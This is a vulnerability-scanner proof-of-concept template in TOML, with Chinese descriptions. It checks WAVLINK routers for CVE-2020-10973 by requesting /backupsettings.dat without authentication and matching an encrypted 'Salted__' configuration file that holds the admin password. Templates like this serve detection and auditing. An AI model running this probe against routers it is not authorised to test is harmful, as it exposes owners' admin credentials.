[info]
author = "ave"
description = "检测 WAVLINK 多款路由器 /backupsettings.dat 接口未授权访问，可获取加密配置文件（含管理员密码）"
id = "POC-AVE-2020-0036"
name = "WAVLINK WN530HG4 信息泄漏漏洞 PoC"
severity = "high"
tags = ["ave-2020-0036"]
vuln_id = [
    "CVE-2020-10973",
    "AVE-2020-0036",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/backupsettings.dat"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "header"
type = "word"
words = ["application/octet-stream"]

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["Salted__"]
